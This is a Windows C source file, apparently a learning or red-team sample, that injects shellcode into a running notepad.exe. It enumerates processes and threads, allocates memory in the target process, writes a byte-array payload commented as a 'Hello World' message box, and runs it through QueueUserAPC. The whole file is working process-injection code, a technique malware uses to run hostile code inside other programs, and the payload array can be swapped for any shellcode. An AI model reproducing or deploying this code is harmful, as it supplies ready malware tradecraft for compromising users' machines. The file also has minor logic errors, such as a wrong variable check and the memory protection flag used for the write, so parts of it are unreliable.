#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>

#define TARGET "notepad.exe"
#define IS_HANDLE_INVALID(x) (x==NULL || x==INVALID_HANDLE_VALUE)

// "Hello World" MessageBox shellcode
unsigned char payload[] = 
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

size_t payload_len = sizeof(payload);

// Find PID from a Process Name
DWORD find_pid(const char* procname) {
    DWORD pid = 0;
    PROCESSENTRY32 pe32;
    
    // Take Snapshot all processes on the system
    // See: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    HANDLE hProcSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, //  Take a snapshot of the processes
        0                   //  Capture a snapshot of all processes in the system
    );

    // Check if handle is valid
    if (IS_HANDLE_INVALID(hProcSnap)) {
        fprintf(stderr, "[!] CreateToolhelp32Snapshot() failed (0x%x)\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);   // Store size of strcut

    // Retrieves information about the first 
    // process encountered in a system snapshot.
    // See: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
    BOOL result = Process32First(hProcSnap, &pe32);

    if (!result) {
        fprintf(stderr, "[!] Process32First() failed (0x%x)\n", GetLastError());
        CloseHandle(hProcSnap);
        return 0;
    }

    // Loop through Snapshot entries
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}

// Find thread ID in a process
DWORD find_threadid(DWORD pid) {
    THREADENTRY32 thEntry;
    thEntry.dwSize = sizeof(THREADENTRY32);
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    BOOL result = Thread32First(hThreadSnap, &thEntry);
    if (!result) {
        fprintf(stderr, "[!] Thread32First() failed (0x%x)\n", GetLastError());
        CloseHandle(hThreadSnap);
        return 0;
    }

    while (Thread32Next(hThreadSnap, &thEntry)) {
        if (thEntry.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID); 
            if (!IS_HANDLE_INVALID(hThread)) {
                CloseHandle(hThread);
                CloseHandle(hThreadSnap);
                return thEntry.th32ThreadID;
            }
            CloseHandle(hThread);
        }
    }
    CloseHandle(hThreadSnap);
    return 0;
}

int inject_apc(DWORD pid) {
    CONTEXT ctx;
    DWORD dResult;
    BOOL bResult;
    DWORD bWritten = 0;

    DWORD thId = find_threadid(pid);
    if (pid == 0) {
        fprintf(stderr, "[!] Could not find any valid ThreadID's\n");
        return -1;
    }

    // Open Handle to Thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thId);
    if (IS_HANDLE_INVALID(hThread)) {
        fprintf(stderr, "[!] OpenThread() failed (0x%x)\n", GetLastError());
        return -1;
    }

    printf("[i] Found Thread with ID: %d\n", thId);

    // Open Handle to Process
    HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);
    if (IS_HANDLE_INVALID(hProcess)) {
        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
        CloseHandle(hThread);
        return -1;
    }

    // Allocate memory in remote process
    LPVOID pRemoteCode =  VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (pRemoteCode == NULL) {
        fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }

    bResult = WriteProcessMemory(hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) &bWritten);
    if (bWritten != payload_len) {
        fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }
        
    if (!bResult) {
        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }
    
   // Execute the payload by adding async procedure call (APC) object to thread's APC queue
    dResult = QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
    if (dResult == 0) {
        fprintf(stderr, "[!] QueueUserAPC() failed! (0x%x)\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }

    dResult = WaitForSingleObject(hThread, -1);
    if (dResult == WAIT_FAILED) {
        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x)\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);       
        return -1;
    } 
    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}

int main() {
    DWORD pid = find_pid(TARGET);
    
    if (pid == 0) {
        fprintf(stderr, "[!] No %s found\n", TARGET);
        return -1;
    }

    printf("[i] %s: %d\n", TARGET, pid);

    int result = inject_apc(pid);
    if (result != 0) 
        fprintf(stderr, "[!] Injection failed\n");
    else 
        printf("[i] Injection successful!\n");
    return 0;
}